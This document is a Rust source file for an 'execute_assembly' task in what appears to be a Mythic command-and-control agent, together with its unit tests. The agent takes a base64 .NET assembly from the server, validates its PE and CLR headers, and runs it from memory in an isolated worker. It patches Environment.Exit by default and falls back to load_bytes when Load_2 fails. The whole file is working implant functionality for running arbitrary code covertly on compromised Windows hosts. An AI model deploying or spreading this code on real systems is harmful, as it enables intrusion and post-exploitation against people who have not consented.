//! Execute a .NET assembly through rustclr in an isolated worker process.
//!
//! Windows only. The Mythic container fetches the selected assembly and sends
//! it as base64 in `assembly_b64`; the agent decodes it and executes the CLR
//! entry point from memory.

#![cfg_attr(not(any(windows, test)), allow(dead_code))]

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

#[derive(Deserialize)]
#[cfg_attr(not(windows), allow(dead_code))]
struct Params {
    assembly_b64: String,
    #[serde(default)]
    assembly_arguments: String,
    #[serde(default = "default_true")]
    patch_exit: bool,
    #[serde(default)]
    max_bytes: Option<u64>,
    #[serde(default = "default_timeout")]
    timeout: u64,
}

fn default_true() -> bool {
    true
}

const fn default_timeout() -> u64 {
    300
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PeMachine {
    I386,
    Amd64,
    Arm64,
    Other(u16),
}

#[derive(Debug, Clone, Copy)]
struct DotNetImageInfo {
    machine: PeMachine,
    cor_flags: u32,
}

const COMIMAGE_FLAGS_ILONLY: u32 = 0x0000_0001;
const COMIMAGE_FLAGS_32BITREQUIRED: u32 = 0x0000_0002;
#[cfg_attr(not(windows), allow(dead_code))]
const MAX_ASSEMBLY_BYTES: u64 = 16 * 1024 * 1024;

fn read_u16(data: &[u8], offset: usize) -> Option<u16> {
    let bytes = data.get(offset..offset.checked_add(2)?)?;
    Some(u16::from_le_bytes([bytes[0], bytes[1]]))
}

fn read_u32(data: &[u8], offset: usize) -> Option<u32> {
    let bytes = data.get(offset..offset.checked_add(4)?)?;
    Some(u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
}

fn rva_to_offset(
    data: &[u8],
    sections_offset: usize,
    section_count: u16,
    rva: u32,
) -> Option<usize> {
    for index in 0..usize::from(section_count) {
        let section = sections_offset.checked_add(index.checked_mul(40)?)?;
        let virtual_size = read_u32(data, section.checked_add(8)?)?;
        let virtual_address = read_u32(data, section.checked_add(12)?)?;
        let raw_size = read_u32(data, section.checked_add(16)?)?;
        let raw_pointer = read_u32(data, section.checked_add(20)?)?;
        let span = virtual_size.max(raw_size).max(1);
        if rva >= virtual_address && rva < virtual_address.saturating_add(span) {
            let delta = rva.checked_sub(virtual_address)?;
            return usize::try_from(raw_pointer.checked_add(delta)?).ok();
        }
    }
    None
}

fn parse_dotnet_image_info(data: &[u8]) -> Result<DotNetImageInfo, String> {
    if data.get(0..2) != Some(b"MZ") {
        return Err("assembly is not a Windows PE file (missing MZ header)".into());
    }

    let pe_offset = usize::try_from(read_u32(data, 0x3c).ok_or("assembly PE header is truncated")?)
        .map_err(|_| "assembly PE header offset is invalid")?;
    if data.get(pe_offset..pe_offset.saturating_add(4)) != Some(b"PE\0\0") {
        return Err("assembly PE signature is invalid".into());
    }

    let machine_raw = read_u16(data, pe_offset + 4).ok_or("assembly COFF header is truncated")?;
    let section_count = read_u16(data, pe_offset + 6).ok_or("assembly COFF header is truncated")?;
    let optional_size =
        usize::from(read_u16(data, pe_offset + 20).ok_or("assembly COFF header is truncated")?);
    let optional_offset = pe_offset
        .checked_add(24)
        .ok_or("assembly optional header offset overflowed")?;
    let optional_magic =
        read_u16(data, optional_offset).ok_or("assembly optional header is truncated")?;
    let data_directory_offset = match optional_magic {
        0x10b => optional_offset + 96,
        0x20b => optional_offset + 112,
        _ => return Err("assembly optional header is not PE32/PE32+".into()),
    };
    let com_directory_offset = data_directory_offset + (14 * 8);
    let com_rva = read_u32(data, com_directory_offset)
        .ok_or("assembly CLR directory is missing or truncated")?;
    let com_size = read_u32(data, com_directory_offset + 4)
        .ok_or("assembly CLR directory is missing or truncated")?;
    if com_rva == 0 || com_size == 0 {
        return Err("assembly is not a .NET assembly (missing CLR directory)".into());
    }

    let sections_offset = optional_offset
        .checked_add(optional_size)
        .ok_or("assembly section table offset overflowed")?;
    let clr_offset = rva_to_offset(data, sections_offset, section_count, com_rva)
        .ok_or("assembly CLR directory points outside mapped sections")?;
    let cor_flags = read_u32(data, clr_offset + 16).ok_or("assembly CLR header is truncated")?;

    let machine = match machine_raw {
        0x014c => PeMachine::I386,
        0x8664 => PeMachine::Amd64,
        0xaa64 => PeMachine::Arm64,
        other => PeMachine::Other(other),
    };

    Ok(DotNetImageInfo { machine, cor_flags })
}

fn contains_ascii_or_utf16le(data: &[u8], needle: &str) -> bool {
    if data
        .windows(needle.len())
        .any(|window| window == needle.as_bytes())
    {
        return true;
    }

    let utf16 = needle
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect::<Vec<_>>();
    data.windows(utf16.len())
        .any(|window| window == utf16.as_slice())
}

fn runtime_target_hint(data: &[u8]) -> Option<&'static str> {
    if contains_ascii_or_utf16le(data, ".NETCoreApp") {
        Some(".NETCoreApp")
    } else if contains_ascii_or_utf16le(data, ".NETStandard") {
        Some(".NETStandard")
    } else {
        None
    }
}

fn process_arch() -> &'static str {
    std::env::consts::ARCH
}

fn preflight_dotnet_assembly(data: &[u8]) -> Result<(), String> {
    let info = parse_dotnet_image_info(data)?;
    if let Some(target) = runtime_target_hint(data) {
        return Err(format!(
            "assembly targets {target}; execute_assembly currently hosts the .NET Framework CLR v4 and cannot execute .NET Core/.NET 5+ assemblies"
        ));
    }

    let arch = process_arch();
    match info.machine {
        PeMachine::Amd64 if arch != "x86_64" => {
            return Err(format!(
                "assembly is x64 but the agent process architecture is {arch}; rebuild the payload as x64 or use a compatible assembly"
            ));
        }
        PeMachine::I386 if info.cor_flags & COMIMAGE_FLAGS_32BITREQUIRED != 0 && arch != "x86" => {
            return Err(format!(
                "assembly requires 32-bit CLR but the agent process architecture is {arch}; use a 32-bit payload or an AnyCPU/x64 assembly"
            ));
        }
        PeMachine::Arm64 if arch != "aarch64" => {
            return Err(format!(
                "assembly is ARM64 but the agent process architecture is {arch}; use a compatible payload/assembly pair"
            ));
        }
        PeMachine::Other(machine) => {
            return Err(format!(
                "assembly uses unsupported PE machine type 0x{machine:04x}"
            ));
        }
        _ => {}
    }

    if info.cor_flags & COMIMAGE_FLAGS_ILONLY == 0 {
        return Err(
            "assembly is not IL-only; mixed-mode/native .NET assemblies cannot be loaded by this CLR path"
                .into(),
        );
    }

    Ok(())
}

#[cfg_attr(not(any(windows, test)), allow(dead_code))]
fn format_execute_error(err: impl std::fmt::Display) -> String {
    let message = err.to_string();
    if message.contains("-2147024894") || message.contains("0x80070002") {
        return format!(
            "{message} (0x80070002: CLR could not find the assembly, a dependency, or the required .NET runtime on the target)"
        );
    }
    if message.contains("-2147024885") || message.contains("0x8007000B") {
        return format!(
            "{message} (0x8007000B: BadImageFormat; likely architecture mismatch, mixed-mode/native assembly, or unsupported .NET runtime target)"
        );
    }
    message
}

#[cfg(windows)]
fn is_load2_file_not_found(err: &impl std::fmt::Display) -> bool {
    let message = err.to_string();
    message.contains("Load_2")
        && (message.contains("-2147024894") || message.contains("0x80070002"))
}

#[cfg(any(windows, test))]
fn split_args(input: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;

    for ch in input.chars() {
        match quote {
            Some(q) if ch == q => quote = None,
            Some(_) => cur.push(ch),
            None if ch == '"' || ch == '\'' => quote = Some(ch),
            None if ch.is_whitespace() => {
                if !cur.is_empty() {
                    args.push(std::mem::take(&mut cur));
                }
            }
            None => cur.push(ch),
        }
    }
    if !cur.is_empty() {
        args.push(cur);
    }
    args
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => {
            return TaskResponse::failed(task.id, &format!("execute_assembly parse error: {e}"));
        }
    };

    #[cfg(not(windows))]
    {
        let _ = params;
        TaskResponse::failed(task.id, "execute_assembly is only supported on Windows")
    }

    #[cfg(windows)]
    {
        if !crate::worker::in_worker() {
            return crate::worker::run_isolated_task(task, params.timeout);
        }

        use rustclr::{ClrOutput, RuntimeVersion, RustClrEnv, variant::create_safe_array_args};

        let assembly = match crate::common::base64::decode(&params.assembly_b64) {
            Ok(bytes) => bytes,
            Err(e) => return TaskResponse::failed(task.id, &e),
        };
        let max_bytes = params
            .max_bytes
            .unwrap_or(MAX_ASSEMBLY_BYTES)
            .clamp(1, MAX_ASSEMBLY_BYTES);
        if assembly.len() as u64 > max_bytes {
            return TaskResponse::failed(
                task.id,
                &format!(
                    "assembly is {} bytes, exceeds max_bytes={max_bytes}",
                    assembly.len()
                ),
            );
        }
        if let Err(e) = preflight_dotnet_assembly(&assembly) {
            return TaskResponse::failed(
                task.id,
                &format!("execute_assembly preflight failed: {e}"),
            );
        }
        let args = split_args(&params.assembly_arguments);
        let arg_refs = args.iter().map(String::as_str).collect::<Vec<_>>();

        let mut clr = match rustclr::RustClr::new(assembly.as_slice()) {
            Ok(c) => c.with_output().with_args(arg_refs),
            Err(e) => return TaskResponse::failed(task.id, &format!("rustclr init failed: {e}")),
        };
        if params.patch_exit {
            clr = clr.with_patch_exit();
        }

        let output = match clr.run() {
            Ok(output) => output,
            Err(e) if is_load2_file_not_found(&e) => {
                let env = match RustClrEnv::new(Some(RuntimeVersion::V4)) {
                    Ok(env) => env,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly failed: {}; load_bytes fallback init failed: {}",
                                format_execute_error(e),
                                fallback_err
                            ),
                        );
                    }
                };
                let loaded = match env.app_domain.load_bytes(assembly.as_slice()) {
                    Ok(loaded) => loaded,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly failed: {}; load_bytes fallback failed: {}",
                                format_execute_error(e),
                                format_execute_error(fallback_err)
                            ),
                        );
                    }
                };
                let mscorlib = match env.app_domain.get_assembly("mscorlib") {
                    Ok(mscorlib) => mscorlib,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly load_bytes fallback could not resolve mscorlib: {}",
                                fallback_err
                            ),
                        );
                    }
                };
                let mut output_manager = ClrOutput::new(&mscorlib);
                if let Err(fallback_err) = output_manager.redirect() {
                    return TaskResponse::failed(
                        task.id,
                        &format!(
                            "execute_assembly load_bytes fallback output redirect failed: {}",
                            fallback_err
                        ),
                    );
                }
                let safe_args = match create_safe_array_args(args.clone()) {
                    Ok(safe_args) => safe_args,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly load_bytes fallback arg marshaling failed: {}",
                                fallback_err
                            ),
                        );
                    }
                };
                if let Err(fallback_err) = loaded.run(safe_args) {
                    return TaskResponse::failed(
                        task.id,
                        &format!(
                            "execute_assembly load_bytes fallback invocation failed: {}",
                            fallback_err
                        ),
                    );
                }
                let mut output = match output_manager.capture() {
                    Ok(output) => output,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly load_bytes fallback output capture failed: {}",
                                fallback_err
                            ),
                        );
                    }
                };
                if params.patch_exit {
                    output = format!(
                        "[!] Load_2 failed; used load_bytes fallback without Environment.Exit patch.\n{}",
                        output
                    );
                }
                output
            }
            Err(e) => {
                return TaskResponse::failed(
                    task.id,
                    &format!("execute_assembly failed: {}", format_execute_error(e)),
                );
            }
        };

        TaskResponse {
            task_id: task.id,
            completed: Some(true),
            status: Some("completed".into()),
            user_output: Some(output),
            ..Default::default()
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_split_args_quotes() {
        assert_eq!(
            split_args(r#"triage "/user:alice bob" /nowrap"#),
            vec!["triage", "/user:alice bob", "/nowrap"]
        );
    }

    #[test]
    fn test_split_args_preserves_windows_backslashes() {
        assert_eq!(
            split_args(r#"--path C:\Temp\a.txt "C:\Program Files\x.txt""#),
            vec!["--path", r"C:\Temp\a.txt", r"C:\Program Files\x.txt"]
        );
    }

    #[test]
    fn test_parse_requires_assembly() {
        let task = TaskMessage {
            command: "execute_assembly".into(),
            parameters: "{}".into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("error"));
    }

    #[test]
    fn test_format_execute_error_expands_file_not_found_hresult() {
        let formatted = format_execute_error("Load_2 failed with HRESULT: -2147024894");
        assert!(formatted.contains("0x80070002"));
        assert!(formatted.contains("dependency"));
    }

    fn minimal_dotnet_pe(machine: u16, cor_flags: u32, marker: Option<&str>) -> Vec<u8> {
        let mut data = vec![0u8; 0x500];
        data[0..2].copy_from_slice(b"MZ");
        data[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        data[0x80..0x84].copy_from_slice(b"PE\0\0");
        data[0x84..0x86].copy_from_slice(&machine.to_le_bytes());
        data[0x86..0x88].copy_from_slice(&1u16.to_le_bytes());
        data[0x94..0x96].copy_from_slice(&0xe0u16.to_le_bytes());
        data[0x98..0x9a].copy_from_slice(&0x10bu16.to_le_bytes());

        let com_dir = 0x98 + 96 + 14 * 8;
        data[com_dir..com_dir + 4].copy_from_slice(&0x2000u32.to_le_bytes());
        data[com_dir + 4..com_dir + 8].copy_from_slice(&0x48u32.to_le_bytes());

        let section = 0x98 + 0xe0;
        data[section + 8..section + 12].copy_from_slice(&0x200u32.to_le_bytes());
        data[section + 12..section + 16].copy_from_slice(&0x2000u32.to_le_bytes());
        data[section + 16..section + 20].copy_from_slice(&0x200u32.to_le_bytes());
        data[section + 20..section + 24].copy_from_slice(&0x300u32.to_le_bytes());

        data[0x300..0x304].copy_from_slice(&0x48u32.to_le_bytes());
        data[0x310..0x314].copy_from_slice(&cor_flags.to_le_bytes());

        if let Some(marker) = marker {
            data.extend_from_slice(marker.as_bytes());
        }
        data
    }

    #[test]
    fn test_preflight_rejects_non_pe() {
        let err = preflight_dotnet_assembly(b"not-pe").unwrap_err();
        assert!(err.contains("MZ"));
    }

    #[test]
    fn test_preflight_rejects_dotnet_core_marker() {
        let pe = minimal_dotnet_pe(
            0x014c,
            COMIMAGE_FLAGS_ILONLY,
            Some(".NETCoreApp,Version=v8.0"),
        );
        let err = preflight_dotnet_assembly(&pe).unwrap_err();
        assert!(err.contains(".NETCoreApp"));
    }

    #[test]
    fn test_format_execute_error_expands_bad_image_hresult() {
        let formatted = format_execute_error("Load_3 failed with HRESULT: -2147024885");
        assert!(formatted.contains("0x8007000B"));
        assert!(formatted.contains("architecture"));
    }
}
